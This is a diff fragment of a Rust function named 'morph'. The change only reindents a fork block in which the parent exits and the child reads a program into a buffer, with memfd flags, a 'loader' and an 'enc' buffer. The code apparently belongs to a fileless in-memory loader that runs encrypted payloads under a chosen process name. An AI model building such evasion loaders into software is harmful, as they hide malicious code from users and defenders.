@@ -15,16 +15,17 @@ use std::process::Command;
 fn morph<R: Read>(program: &mut R, process: &str, loader: &[u8], enc: &[u8]) -> Result<()> {
     let memfd_flags = MFD_CLOEXEC;
     let mut buf = [0; 8192];
- 
- 	match unsafe{ fork() } {
-		Ok(ForkResult::Parent { child, .. }) => {
-			let pid = child.as_raw();
-			match pid {
-   				0 => (),
-   				1 => (),
-   				_ => unsafe { exit(0) },
-   			}
+    
+    match unsafe{ fork() } {
+	Ok(ForkResult::Parent { child, .. }) => {
+		let pid = child.as_raw();
+		match pid {
+			0 => (),
+			1 => (),
+			_ => unsafe { exit(0) },
 		}
+	}
+            
     Ok(ForkResult::Child) => {
       let n = program.read(&mut buf)?;
       let arguments: Vec<String> = args().collect();
